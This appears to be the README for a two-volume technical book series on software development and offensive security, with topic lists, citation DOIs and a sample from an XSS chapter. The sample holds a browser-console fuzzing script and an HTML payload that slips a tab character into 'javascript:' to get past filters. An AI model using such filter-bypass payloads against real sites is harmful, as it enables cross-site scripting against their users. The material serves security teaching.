# Cipher Stack

> A two-volume technical book series exploring software development foundations and offensive security concepts.

<p align="center">
  <img src="./assets/frontDevCover.png" width="700">
</p>

---

# Citation

If you use this work, please cite:

Cipher Stack: Dev  
DOI: 10.5281/zenodo.20754677

Cipher Stack: Offense  
DOI: 10.5281/zenodo.20945302

---

## About

Cipher Stack is a two-volume technical book series created to provide a structured learning path across software development and offensive security.

The series focuses on building strong technical foundations, understanding how software systems work, and developing the mindset required to analyze and secure modern applications.

Cipher Stack is divided into two independent but connected volumes:

* **Cipher Stack: Dev**
* **Cipher Stack: Offense**

---

## Sample — XSS: Fuzzing the javascript: Protocol

From **Chapter: XSS** — CipherStack-Offense

Running the following in the browser console finds every Unicode character that, when placed between `javascript` and `:`, still produces a valid `javascript:` protocol — useful against filters that rely on `startsWith('javascript:')`:

```javascript
log = []
let anchor = document.createElement('a');
for (let i = 0; i <= 0x0ffff; i++){
    anchor.href = `javascript${String.fromCodePoint(i)}:`;
    if (anchor.protocol === 'javascript:'){
        log.push(i);
    }
}
console.log(log);
log.map(x => String.fromCharCode(x));
```

Output reveals characters like `\t` (0x09), `\n` (0x0A) and others that browsers normalize silently — allowing payloads like:

```html
<a href="javascript&#x09;:alert(origin)">click</a>
```

This pattern appears throughout the book: understand the spec, find what browsers normalize, exploit the gap between what the filter sees and what the browser executes.

---

# Cipher Stack: Dev

## Overview

Cipher Stack: Dev focuses on programming and software development foundations.

The book is designed to help readers understand the building blocks behind modern software systems, from programming fundamentals to practical development concepts.

Rather than focusing only on syntax, this volume emphasizes understanding how technologies work and how developers think when building software.

## Main Topics

* Programming fundamentals, including:
  - Python
  - JavaScript
  - Bash
  - GO
  - PHP
* Problem-solving and computational thinking (With Real-World projects)
* Software development concepts
* Scripting and automation concepts
* Web development foundations
* Understanding application structure
* Development workflows and practices
* Building technical foundations for security engineering

Publication:

DOI:
https://doi.org/10.5281/zenodo.20754677

---

# Cipher Stack: Offense

## Overview

Cipher Stack: Offense focuses on offensive security concepts and the mindset behind security assessment.

This volume introduces the concepts required to understand how vulnerabilities appear, how systems are analyzed, and how security professionals approach weaknesses in applications and infrastructure.

The focus is on understanding security concepts rather than relying only on automated tools.

## Main Topics

* Security fundamentals
* Attacker mindset and methodology
* Networking concepts for security
* Web application security concepts
* Vulnerability analysis concepts
* Reconnaissance methodology
* Security testing workflows
* Understanding common attack surfaces
* Defensive lessons from offensive techniques

Publication:

DOI:
https://doi.org/10.5281/zenodo.20945302

---

# Repository Structure

```text
CipherStack/
│
├── dev/
│   ├── CipherStack-Dev.md
│   └── CipherStack-Dev.pdf
│
└── Offense/
    ├── CipherStack-Offense.md
    └── CipherStack-Offense.pdf
```

---

# License

This work is licensed under the Creative Commons Attribution 4.0 International License (CC BY 4.0).

---

# Author

Soroush Maleki

Application Security Researcher / Developer


